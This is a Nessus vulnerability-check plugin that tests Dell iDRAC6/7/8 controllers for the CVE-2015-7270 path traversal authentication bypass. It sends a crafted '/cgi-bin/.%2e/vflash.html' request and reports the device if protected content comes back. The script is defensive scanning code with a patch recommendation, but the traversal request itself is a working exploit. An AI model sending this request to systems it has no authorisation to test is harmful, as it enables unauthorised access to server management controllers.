#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(90265);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2016/04/28 18:33:25 $");

  script_cve_id("CVE-2015-7270");
  script_osvdb_id(131075);

  script_name(english:"Dell iDRAC6 / iDRAC7 / iDRAC8 Path Traversal Authentication Bypass");
  script_summary(english:"Attempts to bypass authentication via path traversal.");

  script_set_attribute(attribute:"synopsis", value:
"The remote device is affected by a path traversal vulnerability that
allows an authentication bypass.");
  script_set_attribute(attribute:"description", value:
"The remote Dell Remote Access Controller (iDRAC6 / iDRAC7 / iDRAC8) is
affected by a path traversal vulnerability. An unauthenticated, remote
attacker can exploit this, via a specially crafted request, to bypass
authentication and gain privileged access to the iDRAC controller.

Note that the application is also reportedly affected by several
additional vulnerabilities, including a format string vulnerability,
an SSH authentication issue with usernames larger than 62 characters,
SSH shell buffer overflows, and an unspecified XML external entity
(XXE) vulnerability; however, Nessus has not tested for these
additional issues.");
  script_set_attribute(attribute:"see_also", value:"http://en.community.dell.com/techcenter/extras/m/white_papers/20441859");
  script_set_attribute(attribute:"solution", value:
"Upgrade to firmware version 2.80 (iDRAC6) / 2.21.21.21 (iDRAC7 and
iDRAC8) or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/12/02");
  script_set_attribute(attribute:"patch_publication_date", value:"2015/11/09");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/04/01");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:dell:idrac6_firmware");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:dell:idrac7_firmware");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/o:dell:idrac8_firmware");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2016 Tenable Network Security, Inc.");

  script_dependencies("drac_detect.nasl");
  script_require_ports("Services/www", 443);
  script_require_keys("installed_sw/iDRAC");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "iDRAC";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:443, embedded:TRUE);

install = get_single_install(
  app_name : app,
  port     : port,
  exit_if_unknown_ver : TRUE
);
version = install['version'];

res = http_send_recv3(
  method : "GET",
  item   : "/cgi-bin/.%2e/vflash.html",
  port   : port,
  add_headers  : make_array("Accept-Encoding", "gzip"),
  exit_on_fail : TRUE
);

if ("var vFlash" >< res[2] && "vflashSize" >< res[2])
{
  output = strstr(res[2], "vflashSize");
  if (empty_or_null(output)) output = res[2];

  security_report_v4(
    port     : port,
    severity : SECURITY_WARNING,
    generic  : TRUE,
    request  : make_list(http_last_sent_request()),
    output   : output
  );
}
else
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app+version, build_url(qs:install['path'], port:port));
